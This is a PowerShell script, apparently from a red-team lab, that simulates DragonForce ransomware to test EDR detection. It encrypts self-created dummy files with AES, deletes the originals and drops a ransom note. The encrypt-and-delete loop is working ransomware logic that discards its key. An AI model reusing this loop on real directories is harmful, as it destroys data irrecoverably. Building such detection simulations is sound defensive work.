<#
.SYNOPSIS
    DragonForce Encryption Simulation - DETECTION TRIGGER
.DESCRIPTION
    Creates and encrypts test files, drops ransom note.
    TTP: T1486
#>
$ErrorActionPreference = "SilentlyContinue"
Write-Host "[*] Starting DragonForce Encryption Simulation (T1486)" -ForegroundColor Cyan
Write-Host "[!] TEST files only - no real user data affected" -ForegroundColor Yellow

$testDir = "C:\temp\dragonforce_test"
if (-not (Test-Path $testDir)) { New-Item -Path $testDir -ItemType Directory -Force | Out-Null }

# Create test files
Write-Host "`n[*] Creating test files..."
@("report.docx", "data.xlsx", "notes.txt", "backup.sql", "config.xml") | ForEach-Object {
    "RTL DragonForce Test Data - $(Get-Date)" | Out-File "$testDir\$_" -Encoding UTF8
    Write-Host "    [+] Created: $_" -ForegroundColor Green
}

# Encrypt with AES
Write-Host "`n[*] [T1486] Encrypting files..."
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.KeySize = 256
$aes.GenerateKey()
$aes.GenerateIV()
$encryptor = $aes.CreateEncryptor()

Get-ChildItem "$testDir" -File | Where-Object { $_.Extension -ne ".dragonforce" } | ForEach-Object {
    try {
        $data = [System.IO.File]::ReadAllBytes($_.FullName)
        $enc = $encryptor.TransformFinalBlock($data, 0, $data.Length)
        [System.IO.File]::WriteAllBytes("$($_.FullName).dragonforce", $enc)
        Remove-Item $_.FullName -Force
        Write-Host "    [!] $($_.Name) -> $($_.Name).dragonforce" -ForegroundColor Red
    } catch {}
}
$aes.Dispose()

# Drop ransom note
@"
=== DragonForce Ransomware ===
[RTL TEST - Red Team Lab Simulation]
Your files have been encrypted. Contact: dragonforce-rtl@test.lab
"@ | Out-File "$testDir\README_RESTORE.txt" -Encoding ASCII
Write-Host "    [+] Ransom note dropped" -ForegroundColor Green

Write-Host "`n[+] DragonForce Encryption Complete." -ForegroundColor Green
Write-Host "[!] Check EDR for: Mass file encryption, ransom note, .dragonforce extension" -ForegroundColor Magenta
